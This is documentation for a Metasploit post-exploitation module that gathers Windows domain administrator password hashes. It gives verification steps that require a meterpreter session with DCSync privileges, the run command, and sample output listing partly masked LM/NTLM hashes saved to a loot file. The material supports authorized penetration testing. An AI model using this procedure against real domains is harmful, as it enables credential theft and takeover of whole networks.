## Vulnerable Application

  The post-exploitation module, `windows/gather/enum_domain_admin_hashes`, is useful for gathering Windows domain administrator password hashes in JTR format.  This module has been observed to obtain more critically-weak LM hashes versus other methods (such as impacket's secretsdump.py).

## Verification Steps

  1. Start `msfconsole`
  2. Obtain a meterpreter session under the context of a domain administrator (or any account with domain DCSync privileges).
  3. Do: ```run post/windows/gather/enum_domain_admin_hashes```
  4. The reported loot file should now have password hashes in JTR-formatted (many of which should include weak LM hashes!).

## Options

  No options are available.

## Scenarios

  ```
meterpreter > run post/windows/gather/enum_domain_admin_hashes 

[*] Loading kiwi module...
[*] Enumerating members of "Domain Admins" group for domain ACME...
[*] Found 5 domain admin accounts.
[+] ACME\Administrator:500:81****************************:b7****************************:::
[+] ACME\janesmith:5000:04****************************:af****************************:::
[+] ACME\johnsmith:5001:5b****************************:e1****************************:::
[+] ACME\lafawnduh:5002:4d****************************:1d****************************:::
[+] ACME\reginaldsmith:5003:ec****************************:20****************************:::
[*] Domain admin hash enumeration complete.
[*] Hashes stored in JTR format in /home/jdog/.msf4/loot/20180508180027_default_10.10.10.154_windows.hashes_65325.txt
  ```
